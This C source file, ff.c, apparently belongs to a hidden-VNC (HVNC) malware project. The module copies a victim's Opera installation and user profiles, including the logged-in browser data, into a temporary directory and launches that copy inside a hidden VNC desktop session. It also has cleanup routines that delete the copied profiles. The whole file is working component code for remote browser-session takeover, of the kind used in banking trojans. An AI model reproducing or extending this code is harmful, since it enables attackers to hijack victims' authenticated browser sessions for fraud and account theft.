//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: ff.c
// $Revision: 194 $
// $Date: 2014-07-11 16:55:06 +0400 (Пт, 11 июл 2014) $
// description: 
//	Opera launch in VNC session support
//	The idea is to duplicate default user profile and opera install directory

#include "project.h"
#include <malloc.h>
#include "exec.h"
#include "copy.h"
#include "rt\str.h"
#include "browser.h"

#define OPR_PREFIXW L"OPR"
#define OPR_PREFIXA "OPR"
#ifdef UNICODE
	#define OPR_PREFIX OPR_PREFIXW
#else
	#define OPR_PREFIX OPR_PREFIXA
#endif

#define LAPP_DATA_VAR_A   "LOCALAPPDATA"
#define APP_DATA_VAR_A   "APPDATA"
#define APP_USER_VAR_A   "USERPROFILE"

#define FF_START_PROFILE_A  " --user-data-dir="
#define FF_DATA_DIR_A       "Opera"
#define FF_DATA_DIR_XP_A    "\\Local Settings\\Application Data"

#define FF_DEFPROFILE_A     "User Data"


#define LAPP_DATA_VAR_W  L"LOCALAPPDATA"
#define APP_DATA_VAR_W   L"APPDATA"
#define APP_USER_VAR_W   L"USERPROFILE"

#define FF_START_PROFILE_W  L" --user-data-dir="
#define FF_DATA_DIR_W       L"Opera"
#define FF_DATA_DIR_XP_W    L"\\Local Settings\\Application Data"

#define FF_DEFPROFILE_W     L"User Data"

extern BOOL VncRemoveDirectory( PVNC_SESSION pSession,LPSTR szPath, LPSTR Pattern);
VOID OPR_Cleanup(PVNC_SESSION pSession);

BOOL OPR_CreateEvent(PVNC_SESSION pSession)
{
	return (BR_CreateEvent(pSession,OPR_PREFIX)!=NULL);
}

BOOL OPR_IsStarted(PVNC_SESSION pSession)
{
	return BR_IsStarted(pSession,OPR_PREFIX);
}
//////////////////////////////////////////////////////////////////////////
// creates copy of the current opera profile
WINERROR OPR_CopyProfileW(PVNC_SESSION pSession, LPWSTR szEnvVar, LPCWSTR szDataDir)
{
	WINERROR Error = NO_ERROR;
	LPWSTR szHvncProfile = NULL;
	ULONG szHvncProfileLength;

	LPWSTR szAppData = NULL;
	ULONG szAppDataLength;
	ULONG BufferLen;
	ULONG szDataDirLength = 0;
	USES_CONVERSION;

	if ( szDataDir ){
		szDataDirLength = lstrlenW(szDataDir);
	}

	do{
		//////////////////////////////////////////////////////////////////////////
		// get default profile name
		// copy default profile
		szAppDataLength = GetEnvironmentVariableW(szEnvVar,NULL,0);
		if ( szAppDataLength == 0 ){
			Error = GetLastError();
			DbgPrint("GetEnvironmentVariableW failed, Error=%x\n",Error);
			break;
		}
		BufferLen = (szAppDataLength+2*(sizeof(FF_DATA_DIR_A)+1)+2 + szDataDirLength)*sizeof(WCHAR); // \\ and 0
		szAppData = hAlloc(BufferLen);
		if ( szAppData == NULL ){
			Error = ERROR_NOT_ENOUGH_MEMORY;
			DbgPrint("hAlloc failed, Error=%x\n",Error);
			break;
		}

		szAppDataLength = GetEnvironmentVariableW(szEnvVar,szAppData,szAppDataLength);
		if ( szAppDataLength == 0 ){
			Error = GetLastError();
			DbgPrint("GetEnvironmentVariableW failed, Error=%x\n",Error);
			break;
		}

		if ( szDataDir ){
			lstrcatW(szAppData,szDataDir);
		}

		// src profile
		lstrcatW(szAppData,L"\\" FF_DATA_DIR_W);

		//////////////////////////////////////////////////////////////////////////
		// construct new profile path
		szHvncProfileLength = BufferLen + (1+pSession->Desktop.NameLength+sizeof("_OPR")+1)*sizeof(WCHAR);
		szHvncProfile = hAlloc(szHvncProfileLength);
		if ( szHvncProfile == NULL ){
			Error = ERROR_NOT_ENOUGH_MEMORY;
			DbgPrint("hAlloc failed, Error=%x\n",Error);
			break;
		}

		// copy profile path
		lstrcpyW(szHvncProfile,szAppData);

		// construct opera profile path
		lstrcatW(szAppData,L"\\" FF_DATA_DIR_W);

		// construct new opera profile path
		lstrcatW(szHvncProfile,L"\\");
		lstrcatW(szHvncProfile,A2W(pSession->Desktop.Name));
		lstrcatW(szHvncProfile,L"_OPR");

		//copy profile
		DbgPrint("[OPR_LaunchW] copy %ws => %ws\n",szAppData,szHvncProfile);
		Error = XCopyDirectorySpecifyProcessW(wczOpera,szAppData,szHvncProfile);

	} while ( FALSE );

	if ( szHvncProfile ){
		hFree( szHvncProfile );
	}
	if ( szAppData ){
		hFree( szAppData );
	}
	return Error;
}

WINERROR OPR_CleanupProfileW(PVNC_SESSION pSession, LPWSTR szEnvVar, LPCWSTR szDataDir, LPWSTR szPattern)
{
	WINERROR Error = NO_ERROR;
	LPWSTR szHvncProfile = NULL;
	ULONG szHvncProfileLength;

	ULONG BufferLen;
	ULONG szDataDirLength = 0;

	if ( szDataDir ){
		szDataDirLength = lstrlenW(szDataDir);
	}

	do{
		//////////////////////////////////////////////////////////////////////////
		// get default profile name
		// copy default profile
		szHvncProfileLength = GetEnvironmentVariableW(szEnvVar,NULL,0);
		if ( szHvncProfileLength == 0 ){
			Error = GetLastError();
			DbgPrint("GetEnvironmentVariableW failed, Error=%x\n",Error);
			break;
		}
		BufferLen = (szHvncProfileLength+2*(sizeof(FF_DATA_DIR_A)+1) + 2 + szDataDirLength + 1)*sizeof(WCHAR); // \\ and 0
		szHvncProfile = hAlloc(BufferLen);
		if ( szHvncProfile == NULL ){
			Error = ERROR_NOT_ENOUGH_MEMORY;
			DbgPrint("hAlloc failed, Error=%x\n",Error);
			break;
		}

		szHvncProfileLength = GetEnvironmentVariableW(szEnvVar,szHvncProfile,szHvncProfileLength);
		if ( szHvncProfileLength == 0 ){
			Error = GetLastError();
			DbgPrint("GetEnvironmentVariableW failed, Error=%x\n",Error);
			break;
		}

		if ( szDataDir ){
			lstrcatW(szHvncProfile,szDataDir);
		}

		// profile name
		lstrcatW(szHvncProfile,L"\\" FF_DATA_DIR_W);

		//copy profile
		if (!XRemoveDirectoryW( szHvncProfile, szPattern, FALSE ))
		{
			Error = GetLastError();
			DbgPrint("XRemoveDirectoryW failed, Error=%x\n",Error);
			break;
		}

	} while ( FALSE );

	if ( szHvncProfile ){
		hFree( szHvncProfile );
	}
	return Error;
}

//////////////////////////////////////////////////////////////////////////
// launches FF with HVNC profile
BOOL OPR_LaunchW(PVNC_SESSION pSession, LPCWSTR szPath)
{
	WINERROR Error = NO_ERROR;
	BOOL fbResult = TRUE;
	
	LPWSTR szOperaPath = NULL;
	LPWSTR szOperaPathEnd;
	ULONG szOperaPathLength;

	LPWSTR szNewOperaPath = NULL;

	BOOL fbNeedToCopy;
	PVOID StatusCtx = NULL;
	HANDLE hCS = NULL;
	USES_CONVERSION;

	do{

		// build vnc profile for our browser
		// (located into the temp directory)
		// %TEMP%\{DESKTOP_GUID}_BROWSER_PREFIX
		szNewOperaPath = BR_GetTempProfileName(pSession,OPR_PREFIXW);
		if ( szNewOperaPath == NULL ){
			Error = GetLastError();
			DbgPrint("BR_BuildTempPath failed, Error=%x\n",Error);
			break;
		}

		// enter to critical section for browsers
		hCS = BR_EnterCriticalSection(pSession);
		if ( hCS == NULL ){
			// failed to start browser
			Error = ERROR_TIMEOUT;
			DbgPrint("BR_EnterCriticalSection failed, szPath=%S\n",szPath);
			break;
		}

		// check if we need to copy profile
		// create named event to identify the running browser copy
		fbNeedToCopy = !OPR_IsStarted(pSession);

		if ( fbNeedToCopy )
		{
			// cleanup old data
			OPR_Cleanup(pSession);

			//////////////////////////////////////////////////////////////////////////
			// get opera install path
			// skip space and quota
			while ( *szPath == L' ' || *szPath == L'\"' ){
				szPath ++;
			}
			// skip binary name
			szOperaPathEnd = wcsrchr(szPath,L'\\');
			// allocate new buffer for app path
			szOperaPathLength = (ULONG)(ULONG_PTR)(szOperaPathEnd-szPath)+1;
			szOperaPath = hAlloc(szOperaPathLength*sizeof(WCHAR)); 
			if ( szOperaPath == NULL ){
				Error = ERROR_NOT_ENOUGH_MEMORY;
				DbgPrint("hAlloc failed, Error=%x\n",Error);
				break;
			}

			// copy path
			lstrcpynW(szOperaPath,szPath,szOperaPathLength);

			// show status window
			StatusCtx = XStatusStartThread(pSession);

			//copy binaries
			Error = XCopyDirectoryW(szOperaPath,szNewOperaPath);
			if ( Error == NO_ERROR ){
				// opera has 2 profile directories:
				// %APPDATA%\\Opera\Opera
				// %LOCALAPPDATA%\\Opera\Opera (WIN7)
				// %USERPROFILE%\\Local Settings\\Application Data\\Opera\Opera (WINXP)
				Error = OPR_CopyProfileW(pSession,APP_DATA_VAR_W,NULL);
				if ( Error == NO_ERROR ){
					if ( IsXP() ){
						Error = OPR_CopyProfileW(pSession,APP_USER_VAR_W,FF_DATA_DIR_XP_W);
					}else{
						Error = OPR_CopyProfileW(pSession,LAPP_DATA_VAR_W,NULL);
					}
				}
			}
		}

	} while ( FALSE );

	// remove status window
	XStatusStopThread(StatusCtx);

	if ( Error == NO_ERROR && szNewOperaPath )
	{
		// start opera
		lstrcatW(szNewOperaPath,L"\\" wczOpera);
		fbResult = ExecuteCommandW(szNewOperaPath,NULL);
	}

	// leave critical section
	BR_LeaveCriticalSection(pSession,hCS );

	if ( szNewOperaPath ){
		hFree ( szNewOperaPath );
	}

	if ( szOperaPath ){
		hFree ( szOperaPath );
	}
	if ( Error != NO_ERROR ){
		SetLastError(Error);
		fbResult = FALSE;
	}else{
		fbResult = TRUE;
	}
	return fbResult;
}

BOOL OPR_LaunchA(PVNC_SESSION pSession, LPCSTR szPath)
{
	USES_CONVERSION;
	return OPR_LaunchW(pSession,A2W(szPath));
}
//////////////////////////////////////////////////////////////////////////
VOID OPR_Cleanup(PVNC_SESSION pSession)
{
	WCHAR szPattern[DESKTOP_NAME_LENGTH+2];
	USES_CONVERSION;
	lstrcpyW(szPattern,A2W(pSession->Desktop.Name));
	lstrcatW(szPattern,L"*");

	OPR_CleanupProfileW(pSession,APP_DATA_VAR_W,NULL,szPattern);
	if ( IsXP() ){
		OPR_CleanupProfileW(pSession,APP_USER_VAR_W,FF_DATA_DIR_XP_W,szPattern);
	}else{
		OPR_CleanupProfileW(pSession,LAPP_DATA_VAR_W,NULL,szPattern);
	}
}